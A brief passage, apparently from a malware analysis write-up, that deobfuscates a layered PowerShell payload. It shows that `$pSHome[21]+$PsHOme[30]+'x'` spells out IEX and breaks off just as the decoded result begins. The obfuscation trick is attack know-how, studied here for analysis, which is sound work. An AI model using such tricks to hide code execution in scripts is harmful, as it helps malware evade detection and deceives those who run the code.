...
```
Not very surprising, more obfuscated PowerShell, let's analyse it. `( $pSHome[21]+$PsHOme[30]+'x')` is just an obfuscated `IEX`, we can execute the third part of the payload directly to deobfuscate it. We obtain the following result:
```powershell
